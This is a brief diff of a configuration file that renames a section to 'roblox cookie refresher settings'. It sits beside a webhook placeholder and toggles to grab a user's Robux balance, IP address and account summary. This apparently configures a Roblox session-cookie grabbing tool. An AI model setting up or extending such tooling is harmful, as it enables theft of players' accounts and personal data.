@@ -6,7 +6,7 @@
 webhook_settings:
  webhook: "webhook here"
 
-message logger settings:
+roblox cookie refresher settings:
   grab robux balance: true
   grab ip address: false
   grab summary: true
